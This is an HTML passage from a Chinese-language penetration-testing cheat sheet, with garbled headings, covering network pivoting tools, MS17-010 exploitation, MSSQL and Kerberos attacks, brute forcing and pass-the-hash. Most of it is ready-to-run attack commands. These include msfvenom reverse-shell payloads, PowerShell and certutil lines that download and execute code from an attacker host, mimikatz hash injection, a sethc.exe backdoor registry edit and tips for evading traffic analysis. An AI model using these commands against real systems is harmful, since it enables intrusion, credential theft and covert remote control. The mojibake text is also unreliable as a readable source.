<h5 id="äºŒçº§ç¯å¢ƒ-Aæ— å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘-ï¼š"><a href="#äºŒçº§ç¯å¢ƒ-Aæ— å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘-ï¼š" class="headerlink" title="äºŒçº§ç¯å¢ƒ(Aæ— å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š"></a>äºŒçº§ç¯å¢ƒ(Aæ— å¤–ç½‘ï¼ŒBå†…ç½‘æ— å¤–ç½‘)ï¼š</h5><pre><code>å¤–ç½‘æ”»å‡»æœºï¼š
&gt;ew â€“s lcx_listen â€“l 10800 â€“e 888
é¶æœºBï¼š
&gt;ew â€“s ssocksd â€“l 999
é¶æœºA:
&gt;ew -s lcx_slave -d å¤–ç½‘ -e 8888 -f é¶æœºB -g 9999 
Sockscap64è¿æ¥æ”»å‡»æœºå¤–ç½‘IP+ç«¯å£ 10080
</code></pre>
<h5 id="ä¸‰çº§ç¯å¢ƒ-Aæ— å¤–ç½‘-Bå†…ç½‘æ— å¤–ç½‘é€šA-Cé€šB-ï¼š"><a href="#ä¸‰çº§ç¯å¢ƒ-Aæ— å¤–ç½‘-Bå†…ç½‘æ— å¤–ç½‘é€šA-Cé€šB-ï¼š" class="headerlink" title="ä¸‰çº§ç¯å¢ƒ(Aæ— å¤–ç½‘,Bå†…ç½‘æ— å¤–ç½‘é€šA,Cé€šB)ï¼š"></a>ä¸‰çº§ç¯å¢ƒ(Aæ— å¤–ç½‘,Bå†…ç½‘æ— å¤–ç½‘é€šA,Cé€šB)ï¼š</h5><pre><code>å¤–ç½‘æ”»å‡»æœºï¼š
&gt;ew -s rcsocks -l 1008 -e 888
é¶æœºAï¼š
&gt;ew -s lcx_slave -d å¤–ç½‘æ”»å‡»æœº -e 888 -f é¶æœºB -g 999
é¶æœºBï¼š
&gt;ew -s lcx_listen -l 999 -e 777
é¶æœºC:
&gt;ew -s rssocks -dé¶æœºB -e 777
Sockscap64è¿æ¥æ”»å‡»æœºå¤–ç½‘IP+ç«¯å£ 1008
</code></pre>
<h4 id="Frp"><a href="#Frp" class="headerlink" title="Frp"></a>Frp</h4><pre><code>https://github.com/fatedier/frp/releases/
ä½¿ç”¨æ¡ä»¶:ç›®æ ‡ä¸»æœºé€šå¤–ç½‘ï¼Œæ‹¥æœ‰è‡ªå·±çš„å…¬ç½‘ip
å¯¹æ”»å‡»æœºå¤–ç½‘æœåŠ¡ç«¯frps.iniè¿›è¡Œé…ç½®
[common]
bind_port=8080
é¶æœºå®¢æˆ·ç«¯
[common]
server_addr=æœåŠ¡å™¨ç«¯å¤–ç½‘IP
server_port=8080
[socks5]
type=tcp
remote_port=12345
plugin=socks5
use_encryption=true
use_compression=true
ä»¥ä¸Šæ˜¯å¯ç”¨åŠ å¯†å’Œå‹ç¼©ï¼Œèƒ½èº²é¿æµé‡åˆ†æè®¾å¤‡ã€‚
ä¸Šä¼ frpc.exeå’Œfrpc.iniåˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Š,ç›´æ¥è¿è¡Œfrpc.exeï¼ˆåœ¨å®æˆ˜ä¸­å¯èƒ½ä¼šæç¤ºæ‰¾ä¸åˆ°é…ç½®æ–‡ä»¶ï¼Œéœ€è¦ä½¿ç”¨-cå‚æ•°æŒ‡å®šé…ç½®æ–‡ä»¶çš„è·¯å¾„frpc.exe -c æ–‡ä»¶è·¯å¾„ï¼‰ï¼Œå¯ä»¥ä¿®æ”¹æ–‡ä»¶åå’Œé…ç½®åä»¥æ··æ·†è§†å¬ã€‚
å…¬ç½‘vpsä¸»æœºä¸Šè¿è¡Œ./frps â€“c frps.ini
é¶æœºæ‰§è¡Œ./frpc â€“c frpc.ini
</code></pre>
<p><img src="./img/347.png" alt="image"></p>
<pre><code>MSFä¸­è®¾ç½®å…¨å±€å˜é‡
&gt;setg proxies å…¬ç½‘IP:12345
&gt;setg ReverseAllowProxy true è¿è¡Œåå‘ä»£ç†
</code></pre>
<p><img src="./img/348.png" alt="image"><br><img src="./img/349.png" alt="image"></p>
<pre><code>ç»“æŸæ”»å‡»
tasklist 
taskkill /pid è¿›ç¨‹å· -t â€“f
</code></pre>
<h4 id="SSF-1"><a href="#SSF-1" class="headerlink" title="SSF"></a>SSF</h4><pre><code>https://github.com/securesocketfunneling/ssf/releases
</code></pre>
<h5 id="æ­£å‘socksä»£ç†"><a href="#æ­£å‘socksä»£ç†" class="headerlink" title="æ­£å‘socksä»£ç†"></a>æ­£å‘socksä»£ç†</h5><pre><code>è¾¹ç•Œæœºå™¨æ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080 linuxæ‰§è¡Œï¼š./ssfd -p 1080
</code></pre>
<p><img src="./img/350.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œï¼š
&gt;ssf.exe -D 12138 -p 1080 192.168.0.98(è¾¹ç•Œæœºå™¨IP)
</code></pre>
<p><img src="./img/351.png" alt="image"></p>
<pre><code>æœ¬æœºé…ç½®proxychainæˆ–proxifier
</code></pre>
<p><img src="./img/352.png" alt="image"></p>
<h5 id="åå‘socksä»£ç†"><a href="#åå‘socksä»£ç†" class="headerlink" title="åå‘socksä»£ç†"></a>åå‘socksä»£ç†</h5><pre><code>æ”»å‡»æœºæ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080
</code></pre>
<p><img src="./img/353.png" alt="image"></p>
<pre><code>å†…ç½‘æœºå™¨æ‰§è¡Œï¼š
&gt;ssf.exe -F 12138 -p 1080 192.168.0.106(æ”»å‡»æœºIP)
</code></pre>
<p><img src="./img/354.png" alt="image"><br><img src="./img/355.png" alt="image"></p>
<h5 id="å¤šçº§çº§è”"><a href="#å¤šçº§çº§è”" class="headerlink" title="å¤šçº§çº§è”"></a>å¤šçº§çº§è”</h5><pre><code>å¤šçº§å†…ç½‘æœºæ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080 -c config.json
Jsonæ–‡ä»¶åŠ å…¥å­—æ®µ
&quot;circuit&quot;: [ 
&#123;&quot;host&quot;: &quot;Aä¸­ç»§æœºIP&quot;, &quot;port&quot;:&quot;1080&quot;&#125;, 
&#123;&quot;host&quot;: &quot;Bä¸­ç»§æœºIP&quot;, &quot;port&quot;:&quot;1080&quot;&#125; 
],
æ‰€æœ‰ä¸­ç»§æœºæ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080 -c config.json
è¾¹ç•Œæœºå™¨æ‰§è¡Œï¼š
&gt;ssf.exe -c config.json -p 1080 å¤šçº§å†…ç½‘æœºIP -X 12138
è¾¹ç•Œæœºæ‰§è¡Œï¼š
&gt;nc.exe 127.0.0.1 12138å³å¯è·å¾—å¤šçº§å†…ç½‘æœºcmdshell
</code></pre>
<h5 id="åå¼¹shell-1"><a href="#åå¼¹shell-1" class="headerlink" title="åå¼¹shell"></a>åå¼¹shell</h5><pre><code>æ”»å‡»æœºæ‰§è¡Œï¼š
&gt;ssfd.exe -p 1080 -c config.json
</code></pre>
<p><img src="./img/356.png" alt="image"></p>
<pre><code>å†…ç½‘æœºå™¨æ‰§è¡Œï¼š
</code></pre>
<p><img src="./img/357.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œï¼š
&gt;nc 127.0.0.1 12138
</code></pre>
<p><img src="./img/358.png" alt="image"></p>
<h4 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h4><pre><code>https://github.com/shadowsocks/libQtShadowsocks/releases/download/v2.0.2/shadowsocks-libqss-v2.0.2-win64.7z
é¶æœºæ–°å»ºé…ç½®æ–‡ä»¶1.jsonï¼Œå†…å®¹ä¸º
&#123;
&quot;server&quot;:&quot;0.0.0.0&quot;,
&quot;server_port&quot;:13337,
&quot;local_address&quot;:&quot;127.0.0.1&quot;,
&quot;local_port&quot;:1080,
&quot;password&quot;:&quot;123456&quot;,
&quot;timeout&quot;:300,
&quot;method&quot;:&quot;aes-256-cfb&quot;,
&quot;fast_open&quot;:false,
&quot;workers&quot;: 1
&#125;
æ‰§è¡Œ
&gt;shadowsocks-libqss.exe -c 1.json â€“S
æ”»å‡»æœºé…ç½®
</code></pre>
<p><img src="./img/359.png" alt="image"></p>
<pre><code>æµè§ˆå™¨æˆ–å…¶ä»–æ”»å‡»è½¯ä»¶é…ç½®ä»£ç†127.0.0.1:1080å³å¯(éœ€æœ‰http(s)/socks5åŠŸèƒ½)
</code></pre>
<p><img src="./img/360.png" alt="image"><br><img src="./img/361.png" alt="image"></p>
<h4 id="Goproxy"><a href="#Goproxy" class="headerlink" title="Goproxy"></a>Goproxy</h4><pre><code>https://github.com/snail007/goproxy/releases
é¶æœºæ‰§è¡Œ
&gt;proxy.exe socks -t tcp -p &quot;0.0.0.0:13337&quot;
</code></pre>
<p><img src="./img/362.png" alt="image"></p>
<pre><code>æ”»å‡»æœºé…ç½®Proxifier
</code></pre>
<p><img src="./img/363.png" alt="image"></p>
<h4 id="Chisel"><a href="#Chisel" class="headerlink" title="Chisel"></a>Chisel</h4><pre><code>https://github.com/jpillora/chisel/releases
æ”»å‡»æœºç›‘å¬
&gt;chisel.exe server -p 12138 --reverse
</code></pre>
<p><img src="./img/364.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;chisel.exe client 192.168.0.102:12138 R:12345:127.0.0.1:12346
</code></pre>
<p><img src="./img/365.png" alt="image"></p>
<pre><code>é¶æœºæ‰§è¡Œ
&gt;chisel.exe server -p 12346 --socks5
</code></pre>
<p><img src="./img/366.png" alt="image"></p>
<pre><code>æ”»å‡»æœºæ‰§è¡Œ
&gt;chisel.exe client 127.0.0.1:12345 socks
</code></pre>
<p><img src="./img/367.png" alt="image"></p>
<pre><code>å½“éš§é“å»ºç«‹æˆåŠŸæ—¶ï¼Œæ”»å‡»æœºæœ¬åœ°ä¼šå¯åŠ¨1080ç«¯å£
</code></pre>
<p><img src="./img/368.png" alt="image"></p>
<pre><code>å³å¯ä½¿ç”¨
</code></pre>
<h4 id="ä»£ç†è½¯ä»¶"><a href="#ä»£ç†è½¯ä»¶" class="headerlink" title="ä»£ç†è½¯ä»¶"></a>ä»£ç†è½¯ä»¶</h4><pre><code>Sockscap64
Proxifier 
Proxychains
#vim /etc/proxychains.conf
å»æ‰dynamic_chainæ³¨é‡Š&gt;æ·»åŠ socks4 127.0.0.1 1080
#cp /usr/lib/proxychains3/proxyresolv /usr/bin
</code></pre>
<h3 id="Ngrokå†…ç½‘ç©¿é€"><a href="#Ngrokå†…ç½‘ç©¿é€" class="headerlink" title="Ngrokå†…ç½‘ç©¿é€"></a>Ngrokå†…ç½‘ç©¿é€</h3><pre><code>https://ngrok.com/
https://www.ngrok.cc/
ä¸‹è½½ngrok
#ngrok authtoken æˆæƒç 
#ngrok http 8080
#ngrok tcp 8888
</code></pre>
<h3 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h3><pre><code>æ‰«æ
#use auxiliary/scanner/smb/smb_ms17_010
#set rhosts 192.168.1.0/24
&amp;
#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms17-010.nse 10.11.1.0/20
æ”»å‡»
#use exploit/windows/smb/ms_17_010_eternalblueæ˜“è“å±
#set payload windows/x64/meterpreter/reverse_tcp
#use auxiliary/admin/smb/ms17_010_command
#set command REG ADD \&quot;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\&quot; /t REG_SZ /v Debugger /d \&quot;C:\\windows\\system32\\cmd.exe\&quot; /f
</code></pre>
<h3 id="MS08-067"><a href="#MS08-067" class="headerlink" title="MS08_067"></a>MS08_067</h3><pre><code>#nmap -sT -p 445,139 -open -v -Pn --script=smb-vuln-ms08-067.nse 10.11.1.0/20
#use exploit/windows/smb/ms08_067_netapi
#set payload windows/meterpreter/reverse_tcp
CVE-2019-0708
</code></pre>
<h3 id="æ”»å‡»MySQLæ•°æ®åº“"><a href="#æ”»å‡»MySQLæ•°æ®åº“" class="headerlink" title="æ”»å‡»MySQLæ•°æ®åº“"></a>æ”»å‡»MySQLæ•°æ®åº“</h3><pre><code>#use auxiliary/scanner/mysql/mysql_version ä¸»æœºå‘ç°
#use auxiliary/scanner/mysql/mysql_login MYSQLçˆ†ç ´
#use exploit/multi/mysql/mysql_udf_payload UDFææƒ
#use exploit/windows/mysql/mysql_mof MOFææƒ
#use auxiliary/admin/mysql/mysql_sql æ‰§è¡Œå‘½ä»¤
</code></pre>
<h3 id="æ”»å‡»MSSQLæ•°æ®åº“"><a href="#æ”»å‡»MSSQLæ•°æ®åº“" class="headerlink" title="æ”»å‡»MSSQLæ•°æ®åº“"></a>æ”»å‡»MSSQLæ•°æ®åº“</h3><pre><code>&gt;PowerShell -Command &quot;[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()&quot; åˆ—å‡ºåŸŸå†…mssqlä¸»æœº
https://github.com/NetSPI/PowerUpSQL
&gt;Get-SQLInstanceLocal          #å‘ç°æœ¬æœºSQLServerå®ä¾‹
&gt;Get-SQLInstanceDomain         #å‘ç°åŸŸä¸­çš„SQLServerå®ä¾‹
&gt;Get-SQLInstanceBroadcast      #å‘ç°å·¥ä½œç»„SQLServerå®ä¾‹
&gt;$Targets = Get-SQLInstanceBroadcast -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; å·¥ä½œç»„mssqlçˆ†ç ´
&gt;$Targets = Get-SQLInstanceDomain -Verbose | Get-SQLConnectionTestThreaded -Verbose -Threads 10 -username sa -password admin | Where-Object &#123;$_.Status -like &quot;Accessible&quot;&#125; 
&gt;Get-SQLInstanceBroadcast -Verbose | Get-SQLServerLoginDefaultPw â€“Verbose
&gt;$Targets åŸŸå†…MSSQLçˆ†ç ´
Nishangè„šæœ¬çˆ†ç ´MSSQL
&gt;Invoke-BruteForce -ComputerName dc.zone.com -UserList C:\test\users.txt -PasswordList C:\test\wordlist.txt -Service SQL -Verbose -StopOnSuccess
#use auxiliary/scanner/mssql/mssql_login çˆ†ç ´ä¸»æœº
#use auxiliary/admin/mssql/mssql_exec è°ƒç”¨cmd
#use auxiliary/admin/mssql/mssql_sql æ‰§è¡ŒSQLè¯­å¥
#use exploit/windows/mssql/mssql_payload ä¸Šçº¿MSSQLä¸»æœº
http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1
å¯¼å…¥nishangæ‰§è¡ŒMSSQLå‘½ä»¤çš„è„šæœ¬
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/nishang/Execution/Execute-Command-MSSQL.ps1&#39;)
&gt;Execute-Command-MSSQL -ComputerName 192.168.0.98 -UserName sa -Password admin ä¼šè¿”å›powershell
#use auxiliary/scanner/mssql/mssql_hashdump å¯¼å‡ºMSSQLå¯†ç 
å·²çŸ¥æœåŠ¡å™¨ntlmhashï¼ŒæœªçŸ¥mssqlè´¦å·å¯†ç 
Hashæ³¨å…¥+socksæ— å¯†ç è¿æ¥mssql
&gt;mimikatz &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:administrator /domain:. /ntlm:&#123;hash&#125; /run:\&quot;C:\*\SocksCap64\SocksCap64_RunAsAdmin.exe\&quot;&quot; &quot;exit&quot;
å°†SSMS.exeåŠ å…¥sockscapä¸­å¯åŠ¨
å‘½ä»¤è¡Œç‰ˆsqltool
https://github.com/uknowsec/SharpSQLTools
</code></pre>
<h3 id="éš”ç¦»ä¸»æœºpayload"><a href="#éš”ç¦»ä¸»æœºpayload" class="headerlink" title="éš”ç¦»ä¸»æœºpayload"></a>éš”ç¦»ä¸»æœºpayload</h3><pre><code>éš”ç¦»ä¸»æœºä¸€èˆ¬ä¸æ”»å‡»æœºæ— åŒå‘è·¯ç”±ï¼Œpayloadè®¾ç½®ä¸ºbindè®©é¶æœºç›‘å¬ã€‚
&gt;set payload windows/meterpreter/bind_tcp
&gt;set RHOST éš”ç¦»æœºIP
</code></pre>
<p><img src="./img/369.png" alt="image"></p>
<h3 id="çˆ†ç ´-2"><a href="#çˆ†ç ´-2" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h3><h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><pre><code>å‚æ•°ï¼š
-l æŒ‡å®šçš„ç”¨æˆ·å -p æŒ‡å®šå¯†ç 
-L ç”¨æˆ·åå­—å…¸  -P å¯†ç å­—å…¸
-s æŒ‡å®šç«¯å£ -o è¾“å‡ºæ–‡ä»¶
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mysql
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 ssh -s 22 -t 4
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 mssql -vv
&gt;hydra -L /root/user.txt -P pass.txt 10.1.1.10 rdp -V
&gt;hydra -L /root/user.txt -P pass.txt smb 10.1.1.10 -vV
&gt;hydra -L /root/user.txt -P pass.txt ftp://10.1.1.10
</code></pre>
<h4 id="Medusa"><a href="#Medusa" class="headerlink" title="Medusa"></a>Medusa</h4><pre><code>å‚æ•°ï¼š
-h ç›®æ ‡åæˆ–IP  -H ç›®æ ‡åˆ—è¡¨
-u ç”¨æˆ·å -U ç”¨æˆ·åå­—å…¸
-p å¯†ç  -P å¯†ç å­—å…¸ -f çˆ†ç ´æˆåŠŸåœæ­¢ -M æŒ‡å®šæœåŠ¡ -t çº¿ç¨‹
-n æŒ‡å®šç«¯å£ -e ns å°è¯•ç©ºå¯†ç å’Œç”¨æˆ·åå¯†ç ç›¸åŒ
&gt;medusa -h ip -u sa -P /pass.txt -t 5 -f -M mssql
&gt;medusa -h ip -U /root/user.txt -P /pass.txt -t 5 -f -M mssql
</code></pre>
<h4 id="åŸŸå†…çˆ†ç ´"><a href="#åŸŸå†…çˆ†ç ´" class="headerlink" title="åŸŸå†…çˆ†ç ´"></a>åŸŸå†…çˆ†ç ´</h4><h5 id="Kerbrute"><a href="#Kerbrute" class="headerlink" title="Kerbrute"></a>Kerbrute</h5><pre><code>https://github.com/ropnop/kerbrute
ç”¨æˆ·æšä¸¾
&gt;kerbrute_windows_amd64.exe userenum -d zone.com username.txt
</code></pre>
<p><img src="./img/371.png" alt="image"><br>    å¯†ç å–·å°„<br>    &gt;kerbrute_windows_amd64.exe passwordspray -d zone.com use.txt password<br><img src="./img/372.png" alt="image"></p>
<pre><code>å¯†ç çˆ†ç ´
æ­¤é¡¹ä¼šäº§ç”Ÿæ—¥å¿—
&gt;kerbrute_windows_amd64.exe bruteuser -d zone.com pass.txt name
</code></pre>
<p><img src="./img/373.png" alt="image"></p>
<pre><code>ç»„åˆçˆ†ç ´
æ ¼å¼ä¸ºusername:password
&gt;kerbrute_windows_amd64.exe -d zone.com bruteforce com.txt
</code></pre>
<h5 id="DomainPasswordSpray"><a href="#DomainPasswordSpray" class="headerlink" title="DomainPasswordSpray"></a>DomainPasswordSpray</h5><pre><code>https://github.com/dafthack/DomainPasswordSpray
è‡ªåŠ¨æ”¶é›†è´¦æˆ·è¿›è¡Œå¯†ç å–·å°„
&gt;Invoke-DomainPasswordSpray -Password pass
</code></pre>
<p><img src="./img/374.png" alt="image"></p>
<pre><code>ç»„åˆçˆ†ç ´
&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -PasswordList passlist.txt -OutFile result.txt
ä¼šäº§ç”Ÿæ—¥å¿—
å•å¯†ç 
&gt;Invoke-DomainPasswordSpray -UserList users.txt -Domain zone.com -Password password
</code></pre>
<h3 id="æ–¹ç¨‹å¼å†…ç½‘ä¸äº§ç”Ÿsession"><a href="#æ–¹ç¨‹å¼å†…ç½‘ä¸äº§ç”Ÿsession" class="headerlink" title="æ–¹ç¨‹å¼å†…ç½‘ä¸äº§ç”Ÿsession"></a>æ–¹ç¨‹å¼å†…ç½‘ä¸äº§ç”Ÿsession</h3><pre><code>msfvenomç”Ÿæˆä¸€ä¸ªx64æˆ–x86çš„dllæ–‡ä»¶ï¼Œæ›¿æ¢è¯¥å·¥å…·ä¸‹çš„x64.dllæˆ–x86.dll
windows server 2008 ï¼Œmsfvenomç”Ÿæˆx64.dllæ–‡ä»¶
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x64.dll
msfé…ç½®
use exploit/multi/handler 
set payload windows/x64/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
å°†è¯¥x64.dllæ›¿æ¢åˆ°æ–¹ç¨‹å¼åˆ©ç”¨å·¥å…·ä¸‹é¢ã€‚
åªéœ€è¦æ›´æ¢ç›®æ ‡çš„IPï¼Œå°±å¯ä»¥è·å–sessionã€‚
windows server 2003 ï¼Œmsfvenomç”Ÿæˆx86.dllæ–‡ä»¶
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.107 LPORT=12345 -f dll &gt; x86.dll
msfé…ç½®
use exploit/multi/handler 
set payload windows/meterpreter/reverse_tcp
set lport 12345
set lhost 192.168.0.107
é€šè¿‡ms17_010_commendæ¨¡å—æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ·»åŠ ç”¨æˆ·è‡³ç®¡ç†å‘˜ã€‚å†æŒ‡å®šSMBPasså’ŒSMBUseræ¥å»ºç«‹windowså¯è®¿é—®å‘½åç®¡é“
</code></pre>
<h3 id="Kerberoasting"><a href="#Kerberoasting" class="headerlink" title="Kerberoasting"></a>Kerberoasting</h3><pre><code> https://github.com/nidem/kerberoast 
</code></pre>
<h4 id="SPNå‘ç°"><a href="#SPNå‘ç°" class="headerlink" title="SPNå‘ç°"></a>SPNå‘ç°</h4><h5 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h5><pre><code>&gt;setspn -T åŸŸå -Q */*
</code></pre>
<p><img src="./img/375.png" alt="image"></p>
<h5 id="Powershell-4"><a href="#Powershell-4" class="headerlink" title="Powershell"></a>Powershell</h5><p><a target="_blank" rel="noopener" href="https://github.com/PyroTek3/PowerShell-AD-Recon">https://github.com/PyroTek3/PowerShell-AD-Recon</a><br><img src="./img/376.png" alt="image"></p>
<pre><code>Powerview
&gt;Get-NetComputer -SPN termsrv*
&gt;Get-NetUser -SPN
</code></pre>
<p><img src="./img/377.png" alt="image"></p>
<pre><code>&gt;import module GetUserSPNs.ps1
</code></pre>
<h5 id="Empire-2"><a href="#Empire-2" class="headerlink" title="Empire"></a>Empire</h5><pre><code>&gt;usemodule situational_awareness/network/get_spn
</code></pre>
<h4 id="ç”³è¯·ç¥¨æ®"><a href="#ç”³è¯·ç¥¨æ®" class="headerlink" title="ç”³è¯·ç¥¨æ®"></a>ç”³è¯·ç¥¨æ®</h4><pre><code>&gt;Add-Type -AssemblyName System.IdentityModel
&gt;New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;SPN&quot;
&amp;
&gt;kerberos::ask /target:SPN
</code></pre>
<h4 id="å¯¼å‡ºç¥¨æ®"><a href="#å¯¼å‡ºç¥¨æ®" class="headerlink" title="å¯¼å‡ºç¥¨æ®"></a>å¯¼å‡ºç¥¨æ®</h4><pre><code>mimikatz&gt;kerberos::list /export
</code></pre>
<h4 id="ç ´è§£å¯†ç "><a href="#ç ´è§£å¯†ç " class="headerlink" title="ç ´è§£å¯†ç "></a>ç ´è§£å¯†ç </h4><pre><code>&gt;python tgsrepcrack.py word.txt file.kirbi
https://github.com/leechristensen/tgscrack
&gt;python extractServiceTicketParts.py file.kirbi
&gt;tgscrack.exe -hashfile hash.txt -wordlist word.txt
</code></pre>
<h4 id="é‡å†™ç¥¨æ®"><a href="#é‡å†™ç¥¨æ®" class="headerlink" title="é‡å†™ç¥¨æ®"></a>é‡å†™ç¥¨æ®</h4><pre><code>&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -u 500
&gt;python kerberoast.py -p Password123 -r file.kirbi -w new.kirbi -g 512
æ³¨å…¥å†…å­˜ã€
&gt;kerberos::ptt new.kirbi
</code></pre>
<h4 id="GetUserSPNs"><a href="#GetUserSPNs" class="headerlink" title="GetUserSPNs"></a>GetUserSPNs</h4><pre><code>https://github.com/SecureAuthCorp/impacket
è¯·æ±‚TGS
&gt;python GetUserSPNs.py -request -dc-ip 10.1.1.1 zone.com/y
ç ´è§£
&gt;hashcat -m 13100 -a 0 kerberos.txt wordlist.txt
</code></pre>
<h3 id="ASEPRoasting"><a href="#ASEPRoasting" class="headerlink" title="ASEPRoasting"></a>ASEPRoasting</h3><pre><code>å½“ç”¨æˆ·å…³é—­äº†kerberosé¢„èº«ä»½è®¤è¯æ—¶å¯ä»¥è¿›è¡Œæ”»å‡»
</code></pre>
<p><img src="./img/378.png" alt="image"></p>
<pre><code>&gt;Rubeus.exe asreproast /user:y /dc:10.1.1.100 /domain:zone.com
</code></pre>
<p><img src="./img/379.png" alt="image"></p>
<pre><code>æˆ–ä½¿ç”¨Powerviewç»“åˆhttps://github.com/gold1029/ASREPRoast
è·å–ä¸è¦æ±‚kerberosé¢„èº«ä»½éªŒè¯çš„åŸŸå†…ç”¨æˆ·
&gt;Get-DomainUser -PreauthNotRequired -Properties distinguishedname â€“Verbose
</code></pre>
<p><img src="./img/380.png" alt="image"></p>
<pre><code>&gt;Get-ASREPHash -UserName y -Domain zone.com -Verbose
</code></pre>
<p><img src="./img/381.png" alt="image"></p>
<pre><code>ç ´è§£RC4-HMAC AS-REP
&gt;john hash.txt --wordlist=wordlist.txt
</code></pre>
<p><img src="./img/382.png" alt="image"></p>
<h3 id="PASS-THE-HASH"><a href="#PASS-THE-HASH" class="headerlink" title="PASS-THE-HASH"></a>PASS-THE-HASH</h3><pre><code>å…è®¸æœ¬åœ°ç®¡ç†ç»„æ‰€æœ‰æˆå‘˜è¿æ¥
&gt;reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f  
</code></pre>
<h4 id="WMIExec-amp-TheHash"><a href="#WMIExec-amp-TheHash" class="headerlink" title="WMIExec &amp; TheHash"></a>WMIExec &amp; TheHash</h4><pre><code>&gt;powershell -ep bypass
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-WMIExec.ps1&#39;); 
&gt;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-TheHash/Invoke-TheHash.ps1&#39;);
&gt;Invoke-TheHash -Type WMIExec -Target 192.168.0.0/24 -Domain zone.com -Username godadmin -Hash f1axxxxxxxxxb771
</code></pre>
<p><img src="./img/383.png" alt="image"></p>
<h4 id="WMI-1"><a href="#WMI-1" class="headerlink" title="WMI"></a>WMI</h4><pre><code>&gt;net use \\1.1.1.1\admin$ /user:&quot;administrator&quot; &quot;password&quot;
&gt;copy windowsupdate.exe \\1.1.1.1\admin$\dir\
&gt;wmic /NODE:&quot;1.1.1.1&quot; /user:&quot;administrator&quot; /password:&quot;password&quot; PROCESS call create &quot;c:\windows\dir\windowsupdate.exe&quot; 
&gt;del \\1.1.1.1\admin$\dir\windowsupdate.exe /F 
&gt;net use \\1.1.1.1\admin$ /del
</code></pre>
<h5 id="wmiexec-py"><a href="#wmiexec-py" class="headerlink" title="wmiexec.py"></a>wmiexec.py</h5><pre><code>https://github.com/SecureAuthCorp/impacket 
&gt;python wmiexec.py -hashes AAD3B435B51404EEAAD3B435B51404EE:A812E6C2DEFCB0A7B80868F9F3C88D09 åŸŸå/Administrator@192.168.11.1 &quot;whoami&quot;
&gt;python wmiexec.py admin@192.168.1.2
</code></pre>
<p><img src="./img/384.png" alt="image"></p>
<h5 id="wmiexec-vbs"><a href="#wmiexec-vbs" class="headerlink" title="wmiexec.vbs"></a>wmiexec.vbs</h5><pre><code>åŠäº¤äº’å¼ï¼š
&gt;cscript //nologo wmiexec.vbs /shell 192.168.1.2 admin pass
å•æ¡å‘½ä»¤
&gt;cscript //nologo wmiexec.vbs /cmd 192.168.1.2 domain\admin pass &quot;whoami&quot;
ä¸‹è½½æ‰§è¡Œ
&gt;wmic /node:192.168.0.115 /user:godadmin /password:password PROCESS call create &quot;cmd /c certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe c:/windows/temp/win.exe &amp; c:/windows/temp/win.exe &amp; certutil.exe -urlcache -split -f http://192.168.0.107/clickme.exe delete&quot;
</code></pre>
<p><img src="./img/385.png" alt="image"></p>
<h5 id="Powershell-5"><a href="#Powershell-5" class="headerlink" title="Powershell"></a>Powershell</h5><pre><code>&gt;wmic /NODE:192.168.3.108 /user:&quot;godadmin&quot; /password:&quot;password&quot; PROCESS call create &quot;powershell -nop -exec bypass -c \&quot;IEX(New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/xxx.txt&#39;);\&quot;&quot;
Invoke-WMIExec
&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1a5b1a3641bec99ff92fe9df700b771 -Command \&quot;net user admin Qwe@123 /add\&quot; -Verbose&quot;
</code></pre>
<p><img src="./img/386.png" alt="image"></p>
<pre><code>&gt;powershell -ep bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.0.107/ps/Invoke-WMIExec.ps1&#39;);Invoke-WMIExec -Target 192.168.0.115 -Domain Workgroup -Username godadmin -Hash f1xxxxxxxxxxxxx771 -Command \&quot;mshta http://192.168.0.107:8080/YAyAPN6odzbAzKn.hta\&quot; -Verbose&quot;
